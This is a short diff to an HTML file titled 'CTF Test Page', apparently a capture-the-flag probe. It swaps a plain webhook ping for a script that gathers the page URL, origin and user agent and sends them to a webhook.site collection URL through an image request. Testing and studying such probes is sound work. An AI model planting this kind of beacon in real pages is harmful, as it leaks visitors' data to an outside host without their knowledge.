@@ -7,11 +7,17 @@
 </head>
 <body>
   <h1>CTF Test Page</h1>
-  <script>
-    fetch(
-      "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35?event=javascript-executed",
-      { mode: "no-cors" }
-    );
-  </script>
+<script>
+const hook = "https://webhook.site/676ec5ae-a5f2-49f7-8044-21c48e3f6a35";
+
+const info = {
+  url: location.href,
+  origin: location.origin,
+  userAgent: navigator.userAgent
+};
+
+new Image().src =
+  hook + "?info=" + encodeURIComponent(JSON.stringify(info));
+</script>
 </body>
 </html>
